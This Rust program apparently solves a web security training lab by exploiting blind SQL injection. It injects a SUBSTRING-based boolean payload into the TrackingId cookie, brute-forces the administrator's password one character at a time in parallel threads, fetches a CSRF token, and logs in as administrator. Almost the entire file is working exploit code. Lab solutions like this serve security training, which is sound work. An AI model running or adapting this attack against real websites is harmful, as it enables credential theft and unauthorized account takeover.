use rayon::prelude::*;
use regex::Regex;
use reqwest::header::COOKIE;
use sql_injection::{
    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, check_is_lab_solved, generate_clap_parser,
    get_csrf_token,
};
use std::sync::{
    Arc, LazyLock,
    atomic::{AtomicBool, Ordering},
};

static TRACKING_ID_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"TrackingId=(.+?);").expect("[-] Failed to generate TRACKING_ID_REGEX")
});

static CHARACTERS: &str = "abcdefghijklmnopqrstuvwxyz0123456789";

fn brute_force_admin_password(lab_url: &str, tracking_id: &str, position: &i32) -> Option<char> {
    println!("[~] Started bruteforcing position {}", position);

    for character in CHARACTERS.chars() {
        let response = HTTP_CLIENT
            .get(format!("{}/", lab_url))
            .header(COOKIE, format!("TrackingId={}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {}, 1) = '{}' --", tracking_id, position, character))
            .send()
            .expect("Failed to send a GET request to /");

        if response.status() == 200 {
            if response
                .text()
                .expect("[-] Failed to extract reponse.text")
                .contains("Welcome back!")
            {
                println!("[~] Ended bruteforcing position {}", position);
                return Some(character);
            }
        } else {
            continue;
        }
    }

    println!("[~] Ended bruteforcing position {}", position);

    None
}

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    logger::info("Fetching the Tracking ID");

    let response = HTTP_CLIENT
        .get(lab_url)
        .send()
        .expect("Failed to send a GET request to /");

    let set_cookie = response
        .headers()
        .get("set-cookie")
        .expect("[-] set-cookie not found");

    let tracking_id = TRACKING_ID_REGEX
        .captures(set_cookie.to_str().expect("[-] Failed to convert to &str"))
        .expect("[-] No captures found")
        .get(1)
        .expect("[-] No capture groups found. Unable to get capture group 1")
        .as_str();

    logger::success(format!("Got th Tracking ID: {}", tracking_id).as_ref());

    logger::info("Now brute-forcing the `administrator` password");

    let stop_flag: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));

    let mut results: Vec<Option<(usize, char)>> = (1..30)
        .into_par_iter()
        .enumerate()
        .map(|(index, position)| {
            if stop_flag.load(Ordering::Relaxed) {
                return None;
            }

            let result: Option<char> = brute_force_admin_password(lab_url, tracking_id, &position);

            match result {
                Some(value) => Some((index, value)),
                None => {
                    logger::info(
                        format!(
                            "Function returned None for input {}, stopping early.",
                            position
                        )
                        .as_ref(),
                    );
                    stop_flag.store(true, Ordering::Relaxed);
                    None
                }
            }
        })
        .collect();

    results.sort_by_key(|option| option.as_ref().map(|(i, _)| *i).unwrap_or(usize::MAX));

    let administrator_password: String = results
        .into_iter()
        .take_while(|res| res.is_some())
        .map(|res| res.unwrap().1)
        .collect();

    if !administrator_password.is_empty() {
        logger::success(format!("Found administrator password: {administrator_password}").as_ref());

        logger::info("Now logging in as administrator");
        logger::info("Getting the login page CSRF TOKEN");

        // Making a GET request to the login page
        let response = HTTP_CLIENT
            .get(format!("{lab_url}/login"))
            .send()
            .expect("[-] Failed to fetch the login page");

        let login_page_csrf_token = get_csrf_token(
            response
                .text()
                .expect("[-] Failed to extract login page body")
                .as_str(),
            &LOGIN_CSRF_TOKEN_SELECTOR,
        );

        logger::success(format!("Login Page CSRF Token: {}", login_page_csrf_token).as_ref());
        logger::info("Performing the login bypass");

        if HTTP_CLIENT
            .post(format!("{}/login", lab_url))
            .form(&[
                ("csrf", login_page_csrf_token),
                ("username", "administrator".to_string()),
                ("password", administrator_password),
            ])
            .send()
            .expect("[-] Failed to login as administrator")
            .status()
            == 200
        {
            logger::success("Login succesfully as administrator");
        } else {
            logger::error("Failed to login as administrator");
        }
    } else {
        panic!(
            "{}",
            logger::error_return("administrator_password is empty")
        )
    }

    check_is_lab_solved(lab_url);
}
